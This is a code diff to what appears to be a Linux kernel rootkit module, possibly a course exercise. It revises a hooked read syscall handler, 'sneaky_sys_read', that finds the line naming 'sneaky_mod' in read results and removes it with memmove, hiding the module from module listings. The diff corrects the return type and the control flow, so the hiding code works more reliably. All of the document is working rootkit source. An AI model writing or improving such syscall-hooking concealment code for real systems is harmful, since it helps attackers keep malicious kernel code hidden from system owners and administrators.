@@ -64,35 +64,34 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 asmlinkage int (*original_read)(struct pt_regs *);
 
-asmlinkage int sneaky_sys_read(struct pt_regs *regs)
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
 {
+  ssize_t res = (ssize_t)original_read(regs);
   char *temp = (char *)regs->si;
   char *start = NULL;
   char * end = NULL; 
-  ssize_t res_s;
 
-  int res = original_read(regs);
   if (res <= 0)
   {
     return res;
   }
 
-  res_s = (ssize_t)res;
-
   start = strstr(temp, "sneaky_mod ");
   if(start == NULL){
-    return (int)res_s;
+    return res;
   }
 
 
   end = strchr(start, '\n');
-  if(end != NULL){
+  if(end==NULL){
+    return res;
+  }else{
     end++;
-    memmove(start, end, temp + res_s - end);
-    res_s -= (ssize_t)(end - start);
+    memmove(start, end, temp + res - end);
+    res -= (ssize_t)(end - start);
   }
 
-  return (int)res_s;
+  return res;
   
 }
 
